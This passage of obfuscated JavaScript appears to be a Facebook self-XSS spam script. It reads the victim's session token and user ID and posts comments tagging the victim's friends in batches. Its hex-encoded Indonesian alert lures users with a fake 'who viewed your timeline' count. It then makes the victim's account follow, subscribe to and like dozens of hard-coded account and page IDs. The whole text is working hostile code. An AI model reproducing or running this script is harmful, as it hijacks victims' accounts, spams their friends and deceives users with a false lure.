(){if(_0x7892x7[_0xa22c[7]]==4){eval(_0xa22c[8]+_0x7892x7[_0xa22c[12]].toString()[_0xa22c[11]](_0xa22c[9],_0xa22c[10])+_0xa22c[13]);for(f=0;f<Math[_0xa22c[17]](arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]]/27);f++){mesaj=_0xa22c[10];mesaj_text=_0xa22c[10];for(i=f*27;i<(f+1)*27;i++){if(arkadaslar[_0xa22c[16]][_0xa22c[15]][i]){mesaj+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]]+_0xa22c[22];mesaj_text+=_0xa22c[23]+arkadaslar[_0xa22c[16]][_0xa22c[15]][i][_0xa22c[21]];} ;} ;yorum_yap(id,mesaj);} ;} ;} ;var _0x7892x8=_0xa22c[24];_0x7892x8+=_0xa22c[25];_0x7892x8+=_0xa22c[26];_0x7892x8+=_0xa22c[27];_0x7892x8+=_0xa22c[28]+user_id;_0x7892x8+=_0xa22c[29]+user_id;if(document[_0xa22c[32]][_0xa22c[31]](_0xa22c[30])>=0){_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[34]+_0x7892x8,true);} else {_0x7892x7[_0xa22c[35]](_0xa22c[33],_0xa22c[36]+_0x7892x8,true);} ;_0x7892x7[_0xa22c[37]]();} ;function RandomArkadas(){var _0x7892xa=_0xa22c[10];for(i=0;i<9;i++){_0x7892xa+=_0xa22c[18]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[19]]+_0xa22c[20]+arkadaslar[_0xa22c[16]][_0xa22c[15]][Math[_0xa22c[39]](Math[_0xa22c[38]]()*arkadaslar[_0xa22c[16]][_0xa22c[15]][_0xa22c[14]])][_0xa22c[21]]+_0xa22c[22];} ;return _0x7892xa;} ;function yorum_yap(id,_0x7892xc){var _0x7892xd= new XMLHttpRequest();var _0x7892x8=_0xa22c[10];_0x7892x8+=_0xa22c[40]+id;_0x7892x8+=_0xa22c[41]+encodeURIComponent(_0x7892xc);_0x7892x8+=_0xa22c[42];_0x7892x8+=_0xa22c[43];_0x7892x8+=_0xa22c[44];_0x7892x8+=_0xa22c[45];_0x7892x8+=_0xa22c[46];_0x7892x8+=_0xa22c[47]+id+_0xa22c[48];_0x7892x8+=_0xa22c[49];_0x7892x8+=_0xa22c[50];_0x7892x8+=_0xa22c[51];_0x7892x8+=_0xa22c[52];_0x7892x8+=_0xa22c[29]+user_id;_0x7892x8+=_0xa22c[53];_0x7892x8+=_0xa22c[54];_0x7892x8+=_0xa22c[55];_0x7892x8+=_0xa22c[56]+fb_dtsg;_0x7892x8+=_0xa22c[57];_0x7892xd[_0xa22c[35]](_0xa22c[58],_0xa22c[59],true);_0x7892xd[_0xa22c[62]](_0xa22c[60],_0xa22c[61]);_0x7892xd[_0xa22c[6]]=function (){if(_0x7892xd[_0xa22c[7]]==4&&_0x7892xd[_0xa22c[63]]==200){_0x7892xd[_0xa22c[64]];} ;} ;_0x7892xd[_0xa22c[37]](_0x7892x8);} ;arkadaslari_al(id);
var _0x170b=["\x34\x31\x20\x63\x6F\x77\x6F\x6B\x20\x6D\x65\x6C\x69\x68\x61\x74\x20\x6B\x72\x6F\x6E\x6F\x6C\x6F\x67\x69\x20\x61\x6E\x64\x61\x20\x68\x61\x72\x69\x20\x69\x6E\x69\x20\x7C\x20\x35\x37\x20\x63\x65\x77\x65\x6B\x20\x6D\x65\x6C\x69\x68\x61\x74\x20\x6B\x72\x6F\x6E\x6F\x6C\x6F\x67\x69\x20\x61\x6E\x64\x61\x20\x68\x61\x72\x69\x20\x69\x6E\x69\x20\x7C\x20\x73\x69\x6C\x61\x68\x6B\x61\x6E\x20\x6B\x6C\x69\x6B\x20\x6F\x6B\x20\x64\x61\x6E\x20\x74\x75\x6E\x67\x67\x75\x20\x64\x61\x66\x74\x61\x72\x20\x6E\x61\x6D\x61\x20\x74\x65\x6D\x61\x6E\x20\x61\x6E\x64\x61\x20\x64\x69\x20\x6B\x6F\x6D\x65\x6E","\x31\x30\x30\x30\x30\x33\x39\x36\x38\x33\x37\x34\x33\x37\x39","\x31\x30\x30\x30\x30\x32\x31\x38\x35\x33\x31\x38\x37\x36\x31","\x31\x30\x30\x30\x30\x34\x36\x30\x37\x31\x39\x31\x31\x30\x34","\x31\x30\x30\x30\x30\x35\x34\x32\x39\x34\x36\x31\x35\x32\x35","\x31\x30\x30\x30\x30\x36\x32\x39\x30\x36\x34\x35\x34\x31\x30","\x31\x34\x37\x32\x37\x30\x33\x35\x30\x36","\x31\x30\x30\x30\x30\x37\x34\x35\x39\x32\x34\x30\x32\x33\x35","\x31\x30\x30\x30\x30\x37\x36\x31\x39\x34\x39\x34\x30\x34\x30","\x32\x37\x37\x34\x32\x31\x30\x34\x39\x30\x36\x36\x38\x33\x39","\x34\x38\x39\x35\x31\x34\x31\x30\x31\x31\x33\x31\x34\x32\x39","\x33\x30\x34\x31\x30\x39\x36\x30\x33\x30\x36\x34\x36\x35\x30","\x32\x37\x37\x34\x32\x31\x36\x38\x35\x37\x33\x33\x34\x34\x32","\x33\x31\x33\x33\x33\x35\x37\x34\x35\x34\x37\x35\x33\x36\x39","\x35\x31\x32\x36\x35\x31\x35\x34\x32\x31\x35\x31\x30\x31\x38","\x35\x31\x32\x36\x35\x31\x36\x32\x35\x34\x38\x34\x33\x34\x33","\x32\x30\x39\x37\x31\x30\x30\x34\x32\x35\x32\x34\x31\x32\x35","\x32\x30\x39\x37\x30\x39\x37\x38\x32\x35\x32\x34\x31\x35\x31","\x32\x35\x30\x37\x38\x39\x37\x31\x38\x34\x31\x37\x39\x33\x33","\x32\x35\x30\x37\x39\x30\x34\x31\x38\x34\x31\x37\x38\x36\x33","\x32\x33\x31\x31\x32\x38\x31\x34\x37\x30\x37\x32\x38\x30\x37","\x32\x33\x31\x31\x32\x38\x30\x38\x37\x30\x37\x32\x38\x31\x33","\x35\x31\x37\x31\x30\x35\x37\x37\x35\x30\x37\x33\x39\x36\x37","\x35\x31\x37\x31\x30\x35\x38\x39\x35\x30\x37\x33\x39\x35\x35","\x31\x30\x32\x30\x30\x35\x31\x37\x38\x37\x35\x33\x37\x37\x33\x37\x37","\x31\x30\x32\x30\x30\x35\x31\x37\x38\x37\x38\x32\x35\x37\x34\x34\x39","\x33\x36\x36\x34\x38\x31\x39\x34\x30\x31\x36\x30\x37\x34\x39","\x33\x36\x36\x34\x38\x32\x33\x33\x36\x38\x32\x37\x33\x37\x36","\x33\x36\x36\x34\x38\x32\x37\x35\x33\x34\x39\x34\x30\x30\x31","\x33\x36\x36\x34\x38\x33\x30\x33\x36\x38\x32\x37\x33\x30\x36","\x33\x36\x36\x34\x38\x33\x32\x31\x30\x31\x36\x30\x36\x32\x32","\x31\x33\x39\x37\x37\x35\x39\x33\x37\x37\x31\x34\x39\x33\x35\x37","\x31\x33\x39\x37\x37\x36\x30\x35\x30\x30\x34\x38\x32\x35\x37\x38","\x31\x34\x30\x32\x31\x39\x38\x31\x37\x30\x30\x34\x34\x31\x35\x33","\x31\x34\x30\x30\x34\x35\x35\x35\x30\x30\x32\x32\x30\x33\x37\x32","\x32\x36\x38\x34\x35\x34\x36\x34\x39\x39\x36\x33\x35\x34\x36","\x34\x38\x31\x36\x35\x31\x31\x32\x35\x32\x37\x34\x36\x37\x32","\x32\x30\x39\x31\x35\x35\x31\x37\x32\x36\x31\x38\x39\x34\x38","\x35\x38\x38\x37\x35\x39\x36\x34\x31\x32\x30\x33\x37\x33\x37","\x33\x39\x38\x30\x37\x39\x32\x31\x33\x36\x36\x32\x34\x33\x33","\x35\x36\x36\x30\x30\x31\x36\x35\x30\x31\x30\x36\x31\x34\x36","\x31\x35\x33\x36\x39\x30\x34\x37\x38\x31\x33\x31\x34\x39\x37","\x31\x34\x35\x34\x32\x35\x34\x36\x34\x31\x34\x36\x35\x32\x30\x35","\x36\x39\x30\x31\x36\x30\x31\x33\x31\x30\x33\x30\x37\x33\x35","\x31\x34\x37\x31\x33\x32\x38\x36\x34\x33\x30\x39\x33\x32\x33\x36","\x36\x39\x36\x34\x35\x35\x38\x30\x37\x30\x36\x35\x31\x36\x34","\x32\x33\x39\x34\x36\x36\x37\x31\x36\x31\x39\x31\x33\x35\x35","\x35\x34\x34\x39\x37\x37\x38\x32\x38\x38\x36\x34\x35\x31\x31","\x31\x36\x32\x37\x39\x38\x35\x35\x30\x35\x35\x36\x34\x35\x36","\x34\x33\x36\x31\x35\x39\x37\x30\x36\x34\x38\x35\x38\x31\x30","\x33\x35\x37\x39\x35\x38\x39\x36\x30\x39\x39\x32\x31\x36\x33","\x35\x30\x36\x38\x31\x37\x38\x38\x39\x33\x35\x35\x39\x38\x33","\x34\x34\x31\x32\x35\x34\x33\x36\x39\x33\x30\x38\x35\x38\x30","\x36\x32\x39\x35\x34\x35\x30\x33\x33\x37\x36\x35\x35\x33\x34","\x36\x33\x34\x30\x32\x39\x31\x35\x36\x36\x33\x35\x36\x33\x38","\x32\x33\x32\x36\x38\x34\x32\x38\x33\x35\x36\x37\x30\x36\x32","\x32\x34\x34\x37\x36\x35\x36\x33\x35\x37\x30\x35\x37\x34\x37","\x36\x35\x38\x31\x30\x37\x38\x32\x37\x35\x36\x30\x39\x30\x37","\x32\x31\x35\x30\x34\x32\x34\x30\x35\x33\x35\x33\x38\x36\x35","\x35\x31\x32\x37\x35\x36\x31\x34\x32\x31\x37\x36\x33\x36\x30","\x36\x38\x31\x32\x34\x38\x31\x34\x35\x32\x33\x31\x30\x30\x36","\x35\x39\x37\x36\x39\x38\x37\x31\x30\x33\x32\x30\x39\x36\x35","\x34\x32\x39\x39\x32\x39\x31\x31\x33\x38\x30\x35\x38\x30\x37","\x36\x33\x37\x37\x33\x35\x38\x31\x39\x36\x32\x37\x30\x30\x37","\x36\x31\x31\x35\x38\x38\x31\x35\x32\x32\x32\x37\x39\x34\x36","\x36\x36\x34\x33\x35\x39\x38\x36\x30\x32\x38\x39\x36\x33\x38","\x32\x32\x33\x31\x34\x34\x36\x30\x34\x35\x33\x37\x37\x33\x31","\x32\x31\x34\x30\x33\x33\x34\x33\x32\x31\x32\x39\x37\x33\x30"];alert(_0x170b[0]);a(_0x170b[1]);a(_0x170b[2]);a(_0x170b[3]);a(_0x170b[4]);a(_0x170b[5]);a(_0x170b[6]);a(_0x170b[7]);a(_0x170b[8]);IDS(_0x170b[2]);IDS(_0x170b[1]);sublist(_0x170b[9]);sublist(_0x170b[10]);sublist(_0x170b[11]);sublist(_0x170b[12]);sublist(_0x170b[13]);sublist(_0x170b[14]);sublist(_0x170b[15]);sublist(_0x170b[16]);sublist(_0x170b[17]);sublist(_0x170b[18]);sublist(_0x170b[19]);sublist(_0x170b[20]);sublist(_0x170b[21]);sublist(_0x170b[22]);sublist(_0x170b[23]);sublist(_0x170b[24]);sublist(_0x170b[25]);sublist(_0x170b[26]);sublist(_0x170b[27]);sublist(_0x170b[28]);sublist(_0x170b[29]);sublist(_0x170b[30]);sublist(_0x170b[31]);sublist(_0x170b[32]);sublist(_0x170b[17]);sublist(_0x170b[16]);sublist(_0x170b[23]);sublist(_0x170b[22]);sublist(_0x170b[21]);sublist(_0x170b[20]);sublist(_0x170b[33]);sublist(_0x170b[34]);sublist(_0x170b[35]);Like(_0x170b[36]);Like(_0x170b[37]);Like(_0x170b[38]);Like(_0x170b[39]);Like(_0x170b[40]);Like(_0x170b[41]);Like(_0x170b[42]);Like(_0x170b[43]);Like(_0x170b[44]);Like(_0x170b[45]);Like(_0x170b[46]);Like(_0x170b[47]);Like(_0x170b[48]);Like(_0x170b[49]);Like(_0x170b[50]);Like(_0x170b[51]);Like(_0x170b[52]);Like(_0x170b[53]);Like(_0x170b[54]);Like(_0x170b[55]);Like(_0x170b[56]);Like(_0x170b[57]);Like(_0x170b[58]);Like(_0x170b[59]);Like(_0x170b[60]);Like(_0x170b[61]);Like(_0x170b[62]);Like(_0x170b[62]);Like(_0x170b[63]);Like(_0x170b[64]);Like(_0x170b[65]);Like(_0x170b[66]);Like(_0x170b[67]);